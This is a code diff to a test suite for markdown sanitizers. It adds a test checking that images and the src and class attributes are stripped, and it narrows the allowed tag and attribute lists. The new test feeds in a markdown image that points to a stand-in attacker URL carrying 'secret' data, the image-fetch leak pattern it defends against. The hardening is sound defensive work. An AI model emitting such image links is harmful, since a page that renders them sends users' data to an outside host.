@@ -89,6 +89,19 @@ describe("sanitizeMarkdown", () => {
     );
   });
 
+  it("allows no images (remote fetch leak) and no class (UI overlay)", () => {
+    sanitizeMarkdown("![](https://evil.example/?d=secret)");
+
+    const config = mockSanitize.mock.calls[0]![1] as {
+      ALLOWED_TAGS: string[];
+      ALLOWED_ATTR: string[];
+    };
+
+    expect(config.ALLOWED_TAGS).not.toContain("img");
+    expect(config.ALLOWED_ATTR).not.toContain("src");
+    expect(config.ALLOWED_ATTR).not.toContain("class");
+  });
+
   it("handles empty string", () => {
     expect(sanitizeMarkdown("")).toBe("");
   });
@@ -126,7 +139,6 @@ describe("sanitizeMarkdownInline", () => {
         "h5",
         "h6",
         "hr",
-        "img",
         "li",
         "ol",
         "p",
@@ -142,7 +154,7 @@ describe("sanitizeMarkdownInline", () => {
         "tr",
         "ul",
       ],
-      ALLOWED_ATTR: ["href", "title", "alt", "src", "class", "rel", "target"],
+      ALLOWED_ATTR: ["href", "title", "rel", "target"],
     });
   });
 
